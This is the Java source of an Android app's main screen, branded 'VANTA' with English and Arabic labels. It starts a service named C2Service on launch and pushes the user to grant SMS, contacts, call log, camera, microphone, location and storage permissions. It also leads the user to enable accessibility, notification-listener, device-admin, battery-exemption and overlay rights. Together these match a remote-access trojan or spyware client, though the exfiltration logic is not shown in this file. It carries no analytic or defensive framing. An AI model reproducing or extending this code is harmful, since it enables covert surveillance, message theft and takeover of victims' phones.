package com.vanta.core;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.*;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.*;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.*;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int REQ_ALL = 100;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                             WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);

        FrameLayout root = new FrameLayout(this);
        root.addView(new AntiqueBg(this), new FrameLayout.LayoutParams(-1, -1));

        ScrollView sc = new ScrollView(this);
        LinearLayout col = new LinearLayout(this);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setPadding(56, 110, 56, 70);
        col.setGravity(Gravity.CENTER_HORIZONTAL);

        TextView brand = new TextView(this);
        brand.setText("V A N T A");
        brand.setTextColor(Color.parseColor("#D4AF37"));
        brand.setTextSize(34);
        brand.setTypeface(Typeface.create("serif", Typeface.BOLD));
        brand.setLetterSpacing(0.45f);
        brand.setGravity(Gravity.CENTER);
        col.addView(brand);

        TextView sub = new TextView(this);
        sub.setText("E S T .   M M X X I V");
        sub.setTextColor(Color.parseColor("#8B7355"));
        sub.setTextSize(10);
        sub.setLetterSpacing(0.5f);
        sub.setGravity(Gravity.CENTER);
        sub.setPadding(0, 6, 0, 40);
        col.addView(sub);

        SealView seal = new SealView(this);
        col.addView(seal, new LinearLayout.LayoutParams(600, 600));

        LinearLayout stats = new LinearLayout(this);
        stats.setOrientation(LinearLayout.HORIZONTAL);
        stats.setPadding(0, 40, 0, 40);
        stats.addView(stat("BATTERY", battery() + "%"), new LinearLayout.LayoutParams(0, -2, 1f));
        stats.addView(stat("FREE", storage() + "G"), new LinearLayout.LayoutParams(0, -2, 1f));
        stats.addView(stat("APPS", appsCount() + ""), new LinearLayout.LayoutParams(0, -2, 1f));
        col.addView(stats);

        col.addView(divider());

        col.addView(setting("Grant All Permissions", "منح كل الصلاحيات", v -> requestAll()));
        col.addView(setting("Accessibility Service", "خدمة الوصول", v -> openAccessibility()));
        col.addView(setting("Notification Listener", "قارئ الإشعارات", v -> openNotifListener()));
        col.addView(setting("Device Administrator", "مسؤول الجهاز", v -> openAdmin()));
        col.addView(setting("Battery Exemption", "استثناء من توفير الطاقة", v -> openBattery()));
        col.addView(setting("Overlay Permission", "الظهور فوق التطبيقات", v -> openOverlay()));

        col.addView(divider());

        TextView foot = new TextView(this);
        foot.setText("A  D  M  I  N  I  S  T  R  A  T  O  R");
        foot.setTextColor(Color.parseColor("#5A4A3A"));
        foot.setTextSize(9);
        foot.setLetterSpacing(0.6f);
        foot.setGravity(Gravity.CENTER);
        foot.setPadding(0, 30, 0, 0);
        col.addView(foot);

        sc.addView(col);
        root.addView(sc, new FrameLayout.LayoutParams(-1, -1));
        setContentView(root);

        startService();
        new Handler().postDelayed(this::requestAll, 800);
    }

    private void requestAll() {
        if (Build.VERSION.SDK_INT < 23) return;
        List<String> needed = new ArrayList<>();
        String[] all = {
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE
        };
        for (String p : all)
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED)
                needed.add(p);

        if (Build.VERSION.SDK_INT >= 33)
            if (checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED)
                needed.add("android.permission.POST_NOTIFICATIONS");

        if (!needed.isEmpty())
            requestPermissions(needed.toArray(new String[0]), REQ_ALL);
    }

    private void openAccessibility() {
        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
    }

    private void openNotifListener() {
        startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
    }

    private void openAdmin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(this, AdminReceiver.class);
            if (!dpm.isAdminActive(cn)) {
                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
                startActivity(i);
            }
        } catch (Exception e) {}
    }

    private void openBattery() {
        try {
            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            i.setData(Uri.parse("package:" + getPackageName()));
            startActivity(i);
        } catch (Exception e) {}
    }

    private void openOverlay() {
        try {
            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()));
            startActivity(i);
        } catch (Exception e) {}
    }

    private void startService() {
        try {
            Intent i = new Intent(this, C2Service.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
            else startService(i);
        } catch (Exception e) {}
    }

    private LinearLayout stat(String label, String value) {
        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setGravity(Gravity.CENTER);

        TextView v = new TextView(this);
        v.setText(value);
        v.setTextColor(Color.parseColor("#E8D9B0"));
        v.setTextSize(22);
        v.setTypeface(Typeface.create("serif", Typeface.NORMAL));
        v.setGravity(Gravity.CENTER);
        l.addView(v);

        TextView t = new TextView(this);
        t.setText(label);
        t.setTextColor(Color.parseColor("#7A6A50"));
        t.setTextSize(9);
        t.setLetterSpacing(0.3f);
        l.addView(t);
        return l;
    }

    private View divider() {
        View v = new View(this);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(-1, 1);
        p.setMargins(0, 20, 0, 20);
        v.setLayoutParams(p);
        v.setBackgroundColor(Color.parseColor("#3A2E22"));
        return v;
    }

    private LinearLayout setting(String title, String subtitle, View.OnClickListener click) {
        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setPadding(36, 30, 36, 30);
        GradientDrawable g = new GradientDrawable();
        g.setColor(Color.parseColor("#14100C"));
        g.setCornerRadius(14);
        g.setStroke(1, Color.parseColor("#3A2E22"));
        l.setBackground(g);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(-1, -2);
        p.setMargins(0, 8, 0, 8);
        l.setLayoutParams(p);

        TextView t = new TextView(this);
        t.setText(title);
        t.setTextColor(Color.parseColor("#D4AF37"));
        t.setTextSize(15);
        t.setTypeface(Typeface.create("serif", Typeface.NORMAL));
        l.addView(t);

        TextView s = new TextView(this);
        s.setText(subtitle);
        s.setTextColor(Color.parseColor("#7A6A50"));
        s.setTextSize(12);
        s.setPadding(0, 4, 0, 0);
        l.addView(s);

        l.setOnClickListener(click);
        return l;
    }

    private int battery() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    private long storage() {
        StatFs s = new StatFs(Environment.getDataDirectory().getPath());
        return s.getAvailableBytes() / (1024L * 1024L * 1024L);
    }

    private int appsCount() {
        return getPackageManager().getInstalledApplications(0).size();
    }

    class AntiqueBg extends View {
        private Paint p = new Paint(Paint.ANTI_ALIAS_FLAG);
        private Paint vignette = new Paint(Paint.ANTI_ALIAS_FLAG);
        AntiqueBg(Context c) { super(c); }
        protected void onDraw(Canvas cv) {
            cv.drawColor(Color.parseColor("#0A0806"));
            p.setColor(Color.parseColor("#120E0A"));
            p.setStrokeWidth(1f);
            p.setStyle(Paint.Style.STROKE);
            for (int i = 1; i <= 5; i++) {
                cv.drawCircle(getWidth() * 0.85f, getHeight() * 0.15f, i * 120f, p);
                cv.drawCircle(getWidth() * 0.1f, getHeight() * 0.85f, i * 100f, p);
            }
            RadialGradient rg = new RadialGradient(getWidth()/2f, getHeight()/2f,
                Math.max(getWidth(), getHeight()) * 0.75f,
                Color.TRANSPARENT, Color.parseColor("#CC000000"), Shader.TileMode.CLAMP);
            vignette.setShader(rg);
            cv.drawRect(0, 0, getWidth(), getHeight(), vignette);
        }
    }

    class SealView extends View {
        private Paint ring = new Paint(Paint.ANTI_ALIAS_FLAG);
        private Paint text = new Paint(Paint.ANTI_ALIAS_FLAG);
        private Paint glow = new Paint(Paint.ANTI_ALIAS_FLAG);
        private float angle = 0;
        private Handler h = new Handler();

        SealView(Context c) {
            super(c);
            ring.setStyle(Paint.Style.STROKE);
            ring.setColor(Color.parseColor("#D4AF37"));
            text.setStyle(Paint.Style.FILL);
            text.setColor(Color.parseColor("#D4AF37"));
            text.setTextSize(28);
            text.setTypeface(Typeface.create("serif", Typeface.BOLD));
            text.setTextAlign(Paint.Align.CENTER);
            glow.setStyle(Paint.Style.FILL);

            h.postDelayed(new Runnable() {
                public void run() {
                    angle = (angle + 0.6f) % 360;
                    invalidate();
                    h.postDelayed(this, 40);
                }
            }, 40);
        }

        protected void onDraw(Canvas cv) {
            float cx = getWidth()/2f, cy = getHeight()/2f;
            float r = Math.min(getWidth(), getHeight()) * 0.36f;

            RadialGradient rg = new RadialGradient(cx, cy, r * 1.4f,
                Color.argb(35, 212, 175, 55), Color.TRANSPARENT, Shader.TileMode.CLAMP);
            glow.setShader(rg);
            cv.drawCircle(cx, cy, r * 1.4f, glow);
            glow.setShader(null);

            ring.setStrokeWidth(2f);
            ring.setColor(Color.parseColor("#D4AF37"));
            cv.drawCircle(cx, cy, r, ring);

            ring.setStrokeWidth(1f);
            ring.setColor(Color.parseColor("#8B7355"));
            cv.drawCircle(cx, cy, r * 1.12f, ring);
            cv.drawCircle(cx, cy, r * 0.88f, ring);

            RectF oval = new RectF(cx - r * 1.06f, cy - r * 1.06f, cx + r * 1.06f, cy + r * 1.06f);
            ring.setStrokeWidth(3f);
            ring.setColor(Color.parseColor("#E8D9B0"));
            cv.drawArc(oval, angle, 60, false, ring);
            cv.drawArc(oval, angle + 180, 60, false, ring);

            cv.drawText("V", cx, cy + 10, text);
        }
    }
}
